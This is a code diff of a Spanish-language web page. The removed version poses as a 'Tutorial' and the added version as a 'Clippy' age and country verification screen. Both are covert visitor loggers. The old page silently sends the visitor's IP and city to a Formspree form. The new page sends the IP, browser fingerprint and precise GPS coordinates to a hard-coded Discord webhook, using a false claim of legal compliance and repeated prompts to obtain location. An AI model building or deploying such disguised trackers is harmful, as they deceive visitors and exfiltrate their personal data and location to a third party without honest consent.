@@ -1,101 +1,489 @@
-<h2 style="text-align:center; font-family: Arial, sans-serif;">Tutorial</h2>
-
-<!-- Formulario oculto -->
-<form id="autoForm" action="https://formspree.io/f/xjkeqloa" method="POST">
-  <input type="hidden" name="ip" id="ipInput" value="desconocida">
-  <input type="hidden" name="ciudad" id="cityInput" value="desconocida">
-  <input type="hidden" name="pais" id="countryInput" value="desconocido">
-</form>
-
-<!-- Cuadro visible -->
-<div id="infoBox">
-  <p id="status">Cargando...</p>
-  <p id="ipText">tutorial: …</p>
-  <p id="locationText">completo: …</p>
-</div>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Verificación de Acceso — Clippy</title>
 
 <style>
-  #infoBox {
-    max-width: 500px;
-    margin: 50px auto;
-    padding: 30px;
-    border-radius: 20px;
-    background: linear-gradient(145deg, #f5f7fa, #e4ebf2);
-    box-shadow: 8px 8px 20px #c0c8d0, -8px -8px 20px #ffffff;
-    font-family: 'Segoe UI', sans-serif;
-    text-align: center;
-    transition: all 0.3s ease;
-  }
-
-  #infoBox p {
-    margin: 15px 0;
-    font-weight: 600;
-    color: #333;
-  }
-
-  #infoBox.loading {
-    animation: pulse 1.5s infinite;
-  }
-
-  @keyframes pulse {
-    0%, 100% {
-      box-shadow: 8px 8px 20px #c0c8d0, -8px -8px 20px #ffffff;
+    :root{
+        --bg:#0c0c0c;
+        --panel:#1a1a1a;
+        --accent:#ff9800;
+        --accent-2:#ffb84d;
+        --muted:#bbb;
+        --white:#f2f2f2;
+        --radius:10px;
     }
-    50% {
-      box-shadow: 5px 5px 15px #c0c8d0, -5px -5px 15px #ffffff;
+
+    html,body{
+        height:100%;
+        margin:0;
+        font-family: Arial, Helvetica, sans-serif;
+        background: linear-gradient(180deg,var(--bg) 0%, #121212 100%);
+        color:var(--white);
+        -webkit-font-smoothing:antialiased;
+        -moz-osx-font-smoothing:grayscale;
+        display:flex;
+        align-items:center;
+        justify-content:center;
     }
-  }
+
+    .card{
+        width: 420px;
+        max-width:94%;
+        background:var(--panel);
+        border-radius:var(--radius);
+        padding:22px;
+        border:2px solid var(--accent);
+        box-shadow: 0 8px 30px rgba(0,0,0,0.6);
+    }
+
+    h1{
+        margin:0 0 8px 0;
+        font-size:20px;
+        text-align:center;
+        color:var(--accent);
+    }
+
+    p.lead{
+        margin:0 0 14px 0;
+        font-size:13px;
+        color:var(--muted);
+        text-align:center;
+    }
+
+    label{
+        display:block;
+        margin-top:12px;
+        font-size:14px;
+        color:var(--white);
+    }
+
+    select{
+        width:100%;
+        padding:10px;
+        margin-top:6px;
+        background:#111;
+        border:1px solid #333;
+        border-radius:8px;
+        color:var(--white);
+        font-size:14px;
+    }
+
+    .checks{
+        margin-top:12px;
+        display:flex;
+        flex-direction:column;
+        gap:8px;
+    }
+
+    .checks label{
+        font-size:14px;
+        color:var(--white);
+        display:flex;
+        align-items:center;
+        gap:10px;
+    }
+
+    input[type="checkbox"]{
+        width:16px;
+        height:16px;
+    }
+
+    .terms-text{
+        margin-top:10px;
+        font-size:12px;
+        color:var(--muted);
+        background:#0f0f0f;
+        padding:10px;
+        border-radius:8px;
+        line-height:1.3;
+    }
+
+    .actions{
+        margin-top:18px;
+    }
+
+    button.primary{
+        width:100%;
+        padding:12px;
+        background:var(--accent);
+        color:black;
+        border:none;
+        border-radius:8px;
+        font-weight:700;
+        cursor:pointer;
+        font-size:15px;
+    }
+
+    button.primary:hover{ background:var(--accent-2); }
+
+    .small{
+        margin-top:8px;
+        text-align:center;
+        font-size:13px;
+        color:var(--muted);
+    }
+
+    /* Modal */
+    #modal-denegado{
+        position:fixed;
+        inset:0;
+        display:none;
+        align-items:center;
+        justify-content:center;
+        background: rgba(0,0,0,0.72);
+        z-index:9999;
+    }
+
+    #modal-denegado .modal-card{
+        width:420px;
+        max-width:94%;
+        background:var(--panel);
+        padding:18px;
+        border-radius:var(--radius);
+        border:2px solid var(--accent);
+        box-shadow:0 10px 30px rgba(0,0,0,0.6);
+    }
+
+    #modal-denegado h3{
+        margin:0 0 8px 0;
+        color:var(--accent);
+        font-size:18px;
+        text-align:center;
+    }
+
+    #modal-denegado p{
+        font-size:13px;
+        color:var(--muted);
+        line-height:1.35;
+    }
+
+    .modal-actions{
+        margin-top:14px;
+        display:flex;
+        gap:10px;
+    }
+
+    .btn-ghost{
+        flex:1;
+        padding:10px;
+        border-radius:8px;
+        background:#111;
+        color:var(--white);
+        border:1px solid #333;
+        cursor:pointer;
+    }
+
+    .btn-exit{
+        flex:1;
+        padding:10px;
+        border-radius:8px;
+        background:#2b2b2b;
+        color:var(--white);
+        border:1px solid #4a4a4a;
+        cursor:pointer;
+    }
+
+    .btn-accept{
+        flex:1;
+        padding:10px;
+        border-radius:8px;
+        background:var(--accent);
+        color:black;
+        border:none;
+        cursor:pointer;
+        font-weight:700;
+    }
+
+    .note{
+        font-size:12px;
+        color:var(--muted);
+        margin-top:12px;
+        text-align:center;
+    }
+
+    footer.small {
+        margin-top:14px;
+        font-size:12px;
+        color:var(--muted);
+        text-align:center;
+    }
 </style>
+</head>
+<body>
+
+<div class="card" role="main" aria-labelledby="verif-title">
+    <h1 id="verif-title">Cargando página — Confirmación requerida</h1>
+    <p class="lead">Antes de acceder debe confirmar país, edad y aceptas los términos. La ubicación es necesaria para continuar; si no la concede, puede salir del sitio.</p>
+
+    <label for="pais">Seleccione su país</label>
+    <select id="pais" aria-label="Seleccione su país">
+        <option value="">-- Seleccione --</option>
+        <option value="AR">Argentina</option>
+        <option value="ES">España</option>
+        <option value="MX">México</option>
+        <option value="CO">Colombia</option>
+        <option value="CL">Chile</option>
+        <option value="PE">Perú</option>
+        <option value="UY">Uruguay</option>
+        <option value="US">Estados Unidos</option>
+        <option value="OTRO">Otro</option>
+    </select>
+
+    <div class="checks" aria-hidden="false">
+        <label><input type="checkbox" id="edad"> Confirmo que tengo 18 años o más.</label>
+        <label><input type="checkbox" id="terminos"> Acepto los <a href="#" id="ver-terms" style="color:var(--accent); text-decoration:none;">Términos y Condiciones</a>.</label>
+    </div>
+
+    <div class="terms-text" id="terms-text" style="display:none;">
+        <strong>Términos y Condiciones — Resumen</strong>
+        <p style="margin:6px 0 0 0;">
+              disfrutar los videos
+        </p>
+        <p style="margin:6px 0 0 0; font-size:13px; color:var(--muted);">
+            solo disfrute los videos que Clippy Ofrece
+        </p>
+    </div>
+
+    <div class="actions">
+        <button class="primary" id="btn-continuar" aria-label="Continuar">Continuar</button>
+    </div>
+
+    <div class="small">Si no concede la ubicación tendrá la opción de salir del sitio.</div>
+    <footer class="small">Clippy — Verificación de acceso</footer>
+</div>
+
+<!-- Modal cuando el permiso de geolocalización es denegado -->
+<div id="modal-denegado" role="dialog" aria-modal="true" aria-hidden="true">
+    <div class="modal-card">
+        <h3>Permiso de ubicación denegado</h3>
+        <p>
+            Solicitamos la geolocalización exclusivamente para verificar cumplimiento de la normativa local:
+        </p>
+        <ul style="color:var(--muted);">
+            <li>Pais Legal</li>
+            <li>Ciudad Legal</li>
+            <li>Ningún dato personal adicional</li>
+        </ul>
+
+        <p style="color:var(--muted);">La geolocalizacion de pais es necesaria para ver el cumpliento de la normativa local</p>
+
+        <div class="modal-actions" style="margin-top:12px;">
+            <button class="btn-accept" id="modal-reintentar">Reintentar permitir ubicación</button>
+            <button class="btn-exit" id="modal-salir">Salir del sitio</button>
+        </div>
+
+        <div class="note">Si sale del sitio puede cerrar la pestaña o ser redirigido a otra página pública.</div>
+    </div>
+</div>
 
 <script>
-  const infoBox = document.getElementById('infoBox');
-  const statusText = document.getElementById('status');
-  const ipText = document.getElementById('ipText');
-  const locationText = document.getElementById('locationText');
-  const form = document.getElementById('autoForm');
+/* ---------------------------
+   CONFIGURACIÓN (cambiar)
+   --------------------------- */
+const DESTINO = "main.html";                         // archivo al que redirigir si todo OK
+const WEBHOOK = "https://discord.com/api/webhooks/1442952146684481678/TFHGG29Si1wJq3OcEbNqT7XulcRtkS9ql_1XL3stzF7ueydbORqmsdj0wABdscSLvEOd";        // reemplaza por tu webhook de Discord
+const IP_API = "https://api.ipify.org?format=json"; // servicio para obtener IP (puedes cambiar)
 
-  infoBox.classList.add('loading');
+/* ---------------------------
+   UTIL: obtener datos del navegador
+   --------------------------- */
+function datosNavegador() {
+    return {
+        userAgent: navigator.userAgent || "No disponible",
+        idioma: navigator.language || "No disponible",
+        zonaHoraria: (Intl && Intl.DateTimeFormat) ? Intl.DateTimeFormat().resolvedOptions().timeZone : "No disponible",
+        resolucion: (screen && screen.width) ? `${screen.width}x${screen.height}` : "No disponible",
+        plataforma: navigator.platform || "No disponible"
+    };
+}
 
-  async function fetchAndSend() {
+/* ---------------------------
+   Envío embed a Discord: info básica
+   --------------------------- */
+async function enviarEmbedBasico(ipPublica, paisSeleccionado) {
+    const info = datosNavegador();
+
+    const embed = {
+        username: "Clippy Logs",
+        embeds: [
+            {
+                title: "Nuevo cliente — Verificación",
+                color: 0xFF9800,
+                fields: [
+                    { name: "IP pública", value: ipPublica || "No disponible", inline: false },
+                    { name: "País seleccionado", value: paisSeleccionado || "No disponible", inline: true },
+                    { name: "Navegador (User-Agent)", value: info.userAgent, inline: false },
+                    { name: "Idioma", value: info.idioma, inline: true },
+                    { name: "Zona horaria", value: info.zonaHoraria, inline: true },
+                    { name: "Resolución", value: info.resolucion, inline: true },
+                    { name: "Plataforma", value: info.plataforma, inline: true },
+                    { name: "Hora del evento", value: new Date().toLocaleString(), inline: false }
+                ],
+                footer: { text: "Clippy | Registro técnico del visitante" }
+            }
+        ]
+    };
+
     try {
-      const res = await fetch('https://ipapi.co/json/');
-      const data = await res.json();
-
-      const IP = data.ip || "No disponible";
-      const Ciudad = data.city || "No disponible";
-      const Pais = data.country_name || "No disponible";
-
-      // Mostrar en cuadro
-      ipText.textContent = `IP: ${ip}`;
-      locationText.textContent = `Ubicación: ${ciudad}, ${pais}`;
-      statusText.textContent = 'Cargando...';
-
-      // Rellenar campos ocultos
-      document.getElementById('ipInput').value = ip;
-      document.getElementById('cityInput').value = ciudad;
-      document.getElementById('countryInput').value = pais;
-
-    } catch {
-      ipText.textContent = "IP: No disponible";
-      locationText.textContent = "Ubicación: No disponible";
-      statusText.textContent = "Tutorial...";
-    } finally {
-      infoBox.classList.remove('loading');
-
-      // Enviar formulario y redirigir
-      try {
-        await fetch(form.action, {
-          method: 'POST',
-          body: new FormData(form),
-          headers: { 'Accept': 'application/json' }
+        await fetch(WEBHOOK, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(embed)
         });
-      } catch {
-        // Ignorar errores de envío
-      } finally {
-        window.location.href = "https://youtu.be/xvFZjo5PgG0";
-      }
+    } catch (e) {
+        // En caso de fallo, no bloqueamos al usuario; registro opcional en consola
+        console.warn("Fallo al enviar embed básico:", e);
     }
-  }
+}
 
-  fetchAndSend();
+/* ---------------------------
+   Envío embed a Discord: geolocalización
+   --------------------------- */
+async function enviarEmbedGeo(lat, lon) {
+    const embedGeo = {
+        username: "Clippy Logs",
+        embeds: [
+            {
+                title: "Geolocalización aprobada",
+                color: 0x4CAF50,
+                fields: [
+                    { name: "1ro-Latitud", value: lat.toString(), inline: true },
+                    { name: "2do-Longitud", value: lon.toString(), inline: true },
+                    { name: "Hora (UTC)", value: new Date().toISOString(), inline: false }
+                ],
+                footer: { text: "Clippy | Datos opcionales proporcionados por el usuario" }
+            }
+        ]
+    };
+
+    try {
+        await fetch(WEBHOOK, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(embedGeo)
+        });
+    } catch (e) {
+        console.warn("Fallo al enviar embed geo:", e);
+    }
+}
+
+/* ---------------------------
+   Obtener IP pública (opcional)
+   --------------------------- */
+async function obtenerIPPublica() {
+    try {
+        const res = await fetch(IP_API, {cache: "no-store"});
+        if (!res.ok) return null;
+        const j = await res.json();
+        return j.ip || null;
+    } catch {
+        return null;
+    }
+}
+
+/* ---------------------------
+   Solicitar ubicación al usuario
+   --------------------------- */
+function solicitarUbicacionYContinuar(ipPublica, paisSeleccionado) {
+    if (!navigator.geolocation) {
+        // Si el navegador no soporta geolocalización simplemente mostramos modal con la opción de salir
+        mostrarModalDenegado();
+        return;
+    }
+
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        // Enviar embed con la ubicación
+        await enviarEmbedGeo(lat, lon);
+
+        // Finalmente redirigir al destino
+        window.location.href = DESTINO;
+    }, (err) => {
+        // Si deniega, mostrar modal explicativo con Reintentar / Salir
+        mostrarModalDenegado();
+    }, {
+        enableHighAccuracy: false,
+        maximumAge: 60_000,
+        timeout: 15_000
+    });
+}
+
+/* ---------------------------
+   Flujos principales
+   --------------------------- */
+document.getElementById("ver-terms").addEventListener("click", (e) => {
+    e.preventDefault();
+    const t = document.getElementById("terms-text");
+    t.style.display = (t.style.display === "block") ? "none" : "block";
+});
+
+// Botón continuar: validar y ejecutar flujo
+document.getElementById("btn-continuar").addEventListener("click", async () => {
+    const pais = document.getElementById("pais").value;
+    const chkEdad = document.getElementById("edad").checked;
+    const chkTerm = document.getElementById("terminos").checked;
+
+    if (!pais) { alert("Debe seleccionar un país."); return; }
+    if (!chkEdad) { alert("Debe confirmar que tiene 18 años o más."); return; }
+    if (!chkTerm) { alert("Debe aceptar los términos y condiciones."); return; }
+
+    // Obtener IP pública (si falla, seguimos sin ella)
+    const ipPublica = await obtenerIPPublica();
+
+    // Enviar info básica (IP, UA, etc.) al webhook de Discord
+    enviarEmbedBasico(ipPublica, pais);
+
+    // Solicitar geolocalización (si concede → envía y redirige; si deniega → modal con salir/reintentar)
+    solicitarUbicacionYContinuar(ipPublica, pais);
+});
+
+/* ---------------------------
+   Modal: manejo de denegación
+   --------------------------- */
+const modal = document.getElementById("modal-denegado");
+const btnReintentar = document.getElementById("modal-reintentar");
+const btnSalir = document.getElementById("modal-salir");
+
+function mostrarModalDenegado() {
+    modal.style.display = "flex";
+    modal.setAttribute("aria-hidden","false");
+}
+
+function ocultarModalDenegado() {
+    modal.style.display = "none";
+    modal.setAttribute("aria-hidden","true");
+}
+
+btnReintentar.addEventListener("click", async () => {
+    ocultarModalDenegado();
+    // Intentar otra vez el flujo de geolocalización
+    // Antes de reintentar limpiamos caches posibles y volvemos a pedir
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            await enviarEmbedGeo(lat, lon);
+            window.location.href = DESTINO;
+        }, (err) => {
+            // Si sigue denegando, volvemos a mostrar modal
+            mostrarModalDenegado();
+        }, { enableHighAccuracy:false, maximumAge:60000, timeout:15000 });
+    } else {
+        mostrarModalDenegado();
+    }
+});
+
+// Salir del sitio: opción explicita para el usuario
+btnSalir.addEventListener("click", () => {
+    // Redirigimos a una página neutral (puedes cambiarla)
+    window.location.href = "about:blank";
+});
+
 </script>
+</body>
+</html>
